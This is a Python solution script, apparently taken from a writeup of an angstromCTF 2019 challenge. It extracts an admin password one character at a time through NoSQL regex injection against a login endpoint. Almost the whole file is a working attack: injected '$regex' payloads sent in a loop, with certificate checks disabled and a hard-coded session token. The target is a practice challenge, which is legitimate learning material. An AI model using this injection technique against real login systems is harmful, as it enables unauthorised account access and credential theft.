# https://samcalamos.com.au/2019/04/25/angstrom-2019-no-sequels-2-writeup/
# author: Sam Calamos

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
url = "https://nosequels.2019.chall.actf.co/login"

cookies = {
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1NzI4MjkyfQ.DRgByuPZJc-Ayvmdec5ot2CbjbCe6Bf7ucvI93gc1Wc"
}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            print("Testing %s" % password+c)
            payload={
                "username": "admin", 
                "password": {
                    "$regex": "^"+password+c 
                    }
                }

            r = requests.post(url, json = payload, verify = False, cookies=cookies)
            print(r.text)
            if "bad" in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
                break
